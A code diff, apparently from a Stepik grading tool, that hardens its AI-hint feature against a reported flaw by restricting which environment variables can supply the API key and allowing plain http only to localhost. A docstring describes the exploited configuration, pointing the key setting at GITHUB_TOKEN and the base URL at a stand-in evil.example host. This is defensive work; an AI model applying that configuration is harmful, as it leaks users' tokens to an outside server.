@@ -25,12 +25,33 @@ from __future__ import annotations
 import json
 import os
 from dataclasses import dataclass
+from urllib.parse import urlparse
 
 from stepik_grader.core.diag_log import get_logger, register_secret
 
-__all__ = ["AI_MARKER_EN", "AI_MARKER_RU", "FailureContext", "explain_failure", "is_configured"]
+__all__ = [
+    "AI_MARKER_EN",
+    "AI_MARKER_RU",
+    "FailureContext",
+    "base_url_is_allowed",
+    "env_name_is_allowed",
+    "explain_failure",
+    "is_configured",
+]
 
 _log = get_logger("ai_hints")
+
+# issue #812 (SECD-01): откуда разрешено брать ключ. Имя env-переменной
+# приходит из pyproject.toml, а тот ищется от cwd вверх — то есть приезжает
+# вместе с чужой папкой задач; без ограничения любой файл мог назначить
+# «ключом» посторонний секрет окружения.
+_DEFAULT_KEY_ENV = "STEPIK_GRADER_AI_KEY"
+_ALLOWED_KEY_ENV_PREFIX = "STEPIK_GRADER_"
+
+# issue #812 (SECD-02): по http данные и ключ идут открытым текстом. Локальный
+# провайдер (ollama) по http — штатный сценарий и остаётся разрешённым, а вот
+# http на удалённый хост уже нет: там та же отправка, но через сеть.
+_LOOPBACK_HOSTS = frozenset({"localhost", "127.0.0.1", "::1"})
 
 # Пометка ответа как сгенерированного ИИ (ADR-0003 §5 — не выдаётся за истину
 # грейдера). Локализована; сам текст подсказки — на языке модели (см. промпт).
@@ -86,12 +107,56 @@ def is_configured(config: object) -> bool:
     return bool(getattr(config, "ai_base_url", None) and getattr(config, "ai_model", None))
 
 
+def env_name_is_allowed(env_name: str) -> bool:
+    """Разрешено ли читать ключ из переменной с таким именем (issue #812).
+
+    ``SECD-01``: имя переменной берётся из ``pyproject.toml``, а тот ищется от
+    cwd вверх — то есть приезжает вместе со скачанной или склонированной папкой
+    задач. Проверено прогоном: чужой файл с ``ai_api_key_env = "GITHUB_TOKEN"``
+    и ``ai_base_url = "http://evil.example/v1"`` заставлял грейдер прочитать
+    посторонний токен и отправить его как ``Bearer`` вместе с кодом решения.
+
+    Поэтому имя обязано быть либо дефолтным, либо из собственного пространства
+    ``STEPIK_GRADER_*``: свой ключ пользователь так назвать может, а вот
+    ``GITHUB_TOKEN``/``AWS_SECRET_ACCESS_KEY`` — уже нет.
+    """
+    name = (env_name or "").strip()
+    return name == _DEFAULT_KEY_ENV or name.startswith(_ALLOWED_KEY_ENV_PREFIX)
+
+
+def base_url_is_allowed(base_url: str) -> bool:
+    """Можно ли слать код и ключ на этот адрес (issue #812, ``SECD-02``).
+
+    Схема не проверялась вовсе — прогон показал, что до запроса доходил даже
+    ``ftp://``. Правило: ``https`` куда угодно; ``http`` — только на петлю, где
+    трафик не покидает машину (локальный ollama — штатный сценарий ADR-0003).
+    ``http`` на удалённый хост означал бы код решения и Bearer-ключ открытым
+    текстом по сети.
+    """
+    parsed = urlparse((base_url or "").strip())
+    if parsed.scheme == "https":
+        return True
+    if parsed.scheme != "http":
+        return False
+    return (parsed.hostname or "").lower() in _LOOPBACK_HOSTS
+
+
 def _resolve_key(config: object) -> str | None:
     """Значение ключа из env-переменной (имя — ``ai_api_key_env``); регистрирует
     его в ``diag_log`` для редакции. ``None``, если переменная не задана (локальный
-    провайдер без ключа — это норма)."""
+    провайдер без ключа — это норма) или имя переменной не из своего
+    пространства имён (issue #812)."""
     env_name = str(getattr(config, "ai_api_key_env", "") or "").strip()
     if not env_name:
+        return None
+    if not env_name_is_allowed(env_name):
+        _log.warning(
+            "ai_api_key_env=%r отклонено: допустимы только %s и имена с префиксом %s "
+            "(issue #812) — ключ не читается",
+            env_name,
+            _DEFAULT_KEY_ENV,
+            _ALLOWED_KEY_ENV_PREFIX,
+        )
         return None
     key = (os.environ.get(env_name) or "").strip()
     if not key:
@@ -141,6 +206,13 @@ def _post_chat(config: object, messages: list[dict[str, str]], key: str | None) 
         return None
 
     base_url = str(getattr(config, "ai_base_url", "") or "").rstrip("/")
+    if not base_url_is_allowed(base_url):
+        _log.warning(
+            "ai_base_url=%r отклонён: https — куда угодно, http — только на петлю "
+            "(issue #812); запрос не отправлен",
+            base_url,
+        )
+        return None
     url = f"{base_url}/chat/completions"
     headers = {"Content-Type": "application/json"}
     if key:
